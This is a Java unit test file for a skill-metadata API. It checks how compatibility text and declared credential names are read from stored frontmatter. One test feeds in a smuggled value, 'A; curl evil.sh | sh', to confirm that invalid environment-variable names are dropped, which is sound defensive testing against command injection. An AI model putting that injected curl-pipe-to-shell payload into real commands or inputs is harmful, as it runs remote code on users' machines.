package com.skillmasterai.api;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.Test;
import tools.jackson.databind.json.JsonMapper;

/**
 * The fields lifted out of the author's stored frontmatter: two sentences. A client never parses the
 * document itself, so the server has to answer these the same way on both planes.
 */
class SkillMetaResponseTest {

    private static final JsonMapper JSON = JsonMapper.builder().build();

    @Test
    void compatibilityIsLiftedFromAStoredFrontmatter() {
        assertThat(SkillMetaResponse.compatibilityOf(
                "{\"name\":\"x\",\"compatibility\":\"需要 python3\"}", JSON))
                .isEqualTo("需要 python3");
    }

    @Test
    void anAbsentOrNonTextualCompatibilityReadsAsNull() {
        // The header drops the line rather than printing `compatibility: null`: the field is
        // optional, and a shape that is not a sentence is not one this system can show.
        assertThat(SkillMetaResponse.compatibilityOf("{\"name\":\"x\"}", JSON)).isNull();
        assertThat(SkillMetaResponse.compatibilityOf("{\"compatibility\":42}", JSON)).isNull();
    }

    @Test
    void anUnreadableDocumentReadsAsNullRatherThanFailingTheRead() {
        // A version that exists always has a frontmatter M5 parsed, so this cannot happen in
        // practice; the answer keeps an optional line out rather than turning a read into a 500.
        assertThat(SkillMetaResponse.compatibilityOf("", JSON)).isNull();
    }

    @Test
    void theDeclaredCredentialsComeFromMetadataRequires() {
        assertThat(SkillMetaResponse.requiredCredentials(JSON.readTree("""
                {"metadata":{"requires":{"credentials":["COOKIE","TOKEN"]}}}
                """))).containsExactly("COOKIE", "TOKEN");
    }

    @Test
    void aDeclarationIsReadLenientlyBecauseItIsOnlyAHint() {
        // A duplicate is one variable; a non-string entry and a blank one are not names. None of
        // them may make an otherwise readable skill unreadable.
        assertThat(SkillMetaResponse.requiredCredentials(JSON.readTree("""
                {"metadata":{"requires":{"credentials":["COOKIE",42,"","COOKIE",null,"TOKEN"]}}}
                """))).containsExactly("COOKIE", "TOKEN");
        // Every shape that is not an array of strings declares nothing, rather than failing.
        assertThat(SkillMetaResponse.requiredCredentials(JSON.readTree("{\"metadata\":{}}")))
                .isEmpty();
        assertThat(SkillMetaResponse.requiredCredentials(JSON.readTree(
                "{\"metadata\":{\"requires\":{\"credentials\":\"COOKIE\"}}}"))).isEmpty();
        assertThat(SkillMetaResponse.requiredCredentials(null)).isEmpty();
        // **A name that is not an environment variable name is dropped.** These strings end up
        // inside a command the user is asked to run; an author must not be able to write somebody
        // else's terminal through a declaration.
        assertThat(SkillMetaResponse.requiredCredentials(JSON.readTree("""
                {"metadata":{"requires":{"credentials":["A; curl evil.sh | sh","OK_NAME","A B"]}}}
                """))).containsExactly("OK_NAME");
    }

    @Test
    void theMissingListIsTheDeclaredNamesTheCallerWouldNotReceive() {
        assertThat(SkillMetaResponse.missingOf(java.util.List.of("COOKIE", "TOKEN"),
                java.util.Set.of("COOKIE"))).containsExactly("TOKEN");
        assertThat(SkillMetaResponse.missingOf(java.util.List.of(), java.util.Set.of("COOKIE")))
                .isEmpty();
    }
}
